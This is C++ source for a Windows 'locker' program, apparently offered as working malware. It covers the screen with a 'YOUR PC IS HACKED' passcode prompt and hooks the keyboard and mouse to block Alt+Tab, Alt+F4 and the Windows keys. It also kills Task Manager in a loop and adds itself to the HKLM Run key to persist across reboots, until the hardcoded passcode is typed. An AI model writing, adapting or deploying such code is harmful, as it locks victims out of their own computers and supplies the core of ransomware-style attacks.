//g++ -o Locker.exe Locker.cpp -mwindows -municode
#include <windows.h>
#include <process.h>
#include <tlhelp32.h>

#define ID_EDIT 100
#define ID_BUTTON 101

using namespace std;

LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK KeyHook(int nCode, WPARAM wParam, LPARAM lParam);
LRESULT CALLBACK MouseHook(int nCode, WPARAM wParam, LPARAM lParam);
DWORD32 WINAPI checkProcess(LPVOID lpParam);
DWORD32 WINAPI drawTop(LPVOID lpParam);
LPVOID Registry(DWORD type);

HINSTANCE g_hInst;
LPWSTR lpszClass = TEXT("Locker");
HWND hMain,hEdit,hButton;
int width = GetSystemMetrics(SM_CXSCREEN);
int height = GetSystemMetrics(SM_CYSCREEN);

int APIENTRY wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow){
	MSG Message;
	WNDCLASS WndClass;
	g_hInst = hInstance;
	DWORD32 dwThreadId;
	HANDLE hThreadc = (HANDLE)_beginthreadex(NULL,0,checkProcess,NULL,0,(DWORD32*)&dwThreadId);
	Registry(1);
	
	WndClass.cbClsExtra = 0;
	WndClass.cbWndExtra = 0;
	WndClass.hbrBackground = (HBRUSH)GetStockObject(HOLLOW_BRUSH);
	WndClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	WndClass.hIcon = NULL;
	WndClass.hInstance = hInstance;
	WndClass.lpfnWndProc = (WNDPROC)WndProc;
	WndClass.lpszClassName = lpszClass;
	WndClass.lpszMenuName = NULL;
	WndClass.style = CS_HREDRAW | CS_VREDRAW;
	RegisterClass(&WndClass);
	hMain = CreateWindow(lpszClass, lpszClass, WS_OVERLAPPEDWINDOW | WS_CAPTION, 0, 0, width, height, NULL, (HMENU)NULL, hInstance, NULL);
	HHOOK hookk,hookm;
	hookk = SetWindowsHookEx(WH_KEYBOARD_LL, KeyHook, hInstance, 0);
	hookm = SetWindowsHookEx(WH_MOUSE_LL, MouseHook, hInstance, 0);
	
	SetWindowLong(hMain,GWL_STYLE,GetWindowLong(hMain,GWL_EXSTYLE)&(~(WS_CAPTION|WS_BORDER)));
	SetWindowPos(hMain, NULL,  0, 0, width, height+100,SWP_NOZORDER | SWP_SHOWWINDOW);
	//ShowCursor(false);
	ShowWindow(hMain, nCmdShow);
	
	HWND h=GetDesktopWindow();
	ShowWindow(h, SW_SHOW);
	while(GetMessage(&Message, 0, 0, 0)){
		TranslateMessage(&Message);
		DispatchMessage(&Message);
	}
	return Message.wParam;
}

LRESULT CALLBACK WndProc(HWND hWnd, UINT iMessage, WPARAM wParam, LPARAM lParam){
	HDC hdc;
	PAINTSTRUCT ps;
	switch(iMessage){
	case WM_CREATE:
		HANDLE hThreadt;
		DWORD32 dwThreadId;
		hEdit=CreateWindow(TEXT("edit"),NULL,WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL | ES_CENTER | ES_MULTILINE,width/2-150,height/2,300,25,hWnd,(HMENU)ID_EDIT,g_hInst,NULL);
		hButton=CreateWindow(TEXT("button"),TEXT("UNLOCK"),WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON, width/2-50,height/2+25,100,25,hWnd,(HMENU)ID_BUTTON,g_hInst,NULL);
		SetFocus(hEdit);
		hThreadt = (HANDLE)_beginthreadex(NULL,0,drawTop,NULL,0,(DWORD32*)&dwThreadId);
		return 0;
	case WM_PAINT:
		hdc=BeginPaint(hWnd,&ps);
		SetTextAlign(hdc, TA_CENTER);
		TextOut(hdc,width/2,height/2-40,TEXT("YOUR PC IS HACKED."),18);
		TextOut(hdc,width/2,height/2-20,TEXT("INPUT PASSCODE."),15);
		EndPaint(hWnd,&ps);
		return 0;

	case WM_COMMAND:
		wchar_t str[128];
		switch (LOWORD(wParam)) {
		case ID_EDIT:
			switch (HIWORD(wParam)) {
			case EN_CHANGE:
				GetWindowText(hEdit,str,128);
				SetWindowText(hWnd,str);
			}
			return 0;
		case ID_BUTTON:
			GetWindowText(hEdit,str,128);
			if(wcscmp(str,TEXT("1234"))==0){
				Registry(0);
				exit(1);
			}
			else{
				SetWindowText(hEdit,TEXT(""));
				SetFocus(hEdit);
			}
			return 0;
		}
		return 0;
	case WM_DESTROY:
		PostQuitMessage(0);
		return 0;
	}
	return(DefWindowProc(hWnd, iMessage, wParam, lParam));
}
LRESULT CALLBACK KeyHook(int nCode, WPARAM wParam, LPARAM lParam){
	//ctrl + alt + del http://www.jiniya.net/lecture/maso/hook6.pdf
	KBDLLHOOKSTRUCT *pk = (KBDLLHOOKSTRUCT*)lParam;
	if(nCode == HC_ACTION){
		switch(wParam){
			case WM_KEYDOWN:
			case WM_SYSKEYDOWN:
			case WM_SYSKEYUP:
			case WM_KEYUP:
				if(((pk->vkCode==0x09)&&(pk->flags=0x20))||//alt + tab
				((pk->vkCode==0x1b)&&(pk->flags=0x20))||//alt + esc
				((pk->vkCode==0x1b)&&(pk->flags=0x00))||//ctrl + esc
				((pk->vkCode==0x73)&&(pk->flags=0x20))||//alt + f4
				((pk->vkCode==0x09)&&(pk->flags=0x01))||//tab + window
				((pk->vkCode==0x5b)&&(pk->flags=0x01))||//left + window
				((pk->vkCode==0x5c)&&(pk->flags=0x01)))return 1;//right + window
		}
	}
	return CallNextHookEx(0, nCode, wParam, lParam);
}
LRESULT CALLBACK MouseHook(int nCode, WPARAM wParam, LPARAM lParam){
	POINT Mouse;
	GetCursorPos(&Mouse);
	
	if(Mouse.x<0)Mouse.x=0;
	else if(Mouse.x>width)Mouse.x=width;
	else if(Mouse.y<0)Mouse.y=0;
	else if(Mouse.y>height)Mouse.y=height;
	
	SetCursorPos(Mouse.x, Mouse.y);
	return CallNextHookEx(0, nCode, wParam, lParam);
}
DWORD32 WINAPI checkProcess(LPVOID lpParam){
	while(1){
		Sleep(100);
		HANDLE hSnapshot=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if(hSnapshot){
			PROCESSENTRY32 ProcessEntry32;
			BOOL bProcessFound;
			ProcessEntry32.dwSize=sizeof(PROCESSENTRY32);
			bProcessFound=Process32First(hSnapshot, &ProcessEntry32);
			while(bProcessFound){
				if(wcscmp(ProcessEntry32.szExeFile,TEXT("taskmgr.exe"))==0||
				   wcscmp(ProcessEntry32.szExeFile,TEXT("Taskmgr.exe"))==0){
					HANDLE hProcess;
					hProcess =OpenProcess(SYNCHRONIZE|PROCESS_TERMINATE, TRUE,ProcessEntry32.th32ProcessID);
					TerminateProcess(hProcess,0);
					CloseHandle(hProcess);
				}
				bProcessFound=Process32Next(hSnapshot, &ProcessEntry32);
			}
		}
		CloseHandle(hSnapshot);
	}
    return 0;
}
LPVOID Registry(DWORD type){
	HKEY hKey;
	wchar_t reg_name[10]=TEXT("LOCKER");
	RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_ALL_ACCESS, &hKey);
	if(type){
		wchar_t path[200];
		GetModuleFileName(NULL, path, 200);
		RegSetValueEx(hKey, reg_name, 0, REG_SZ, (BYTE*)path, wcslen(path)*sizeof(wchar_t));
	}
	else{
		RegDeleteValue(hKey, reg_name);
	}
	RegCloseKey(hKey);
}
DWORD32 WINAPI drawTop(LPVOID lpParam){
	while(1){
		Sleep(50);
		HWND hWnd = GetForegroundWindow();
		DWORD fromId = GetCurrentThreadId();
		DWORD toId = GetWindowThreadProcessId(hWnd, NULL); 
		AttachThreadInput(fromId, toId, TRUE);
		HWND hTmp = GetFocus();
		if(!(hTmp==hMain||hTmp==hEdit||hTmp==hButton))SetFocus(hEdit);
	}
	return 0;
}
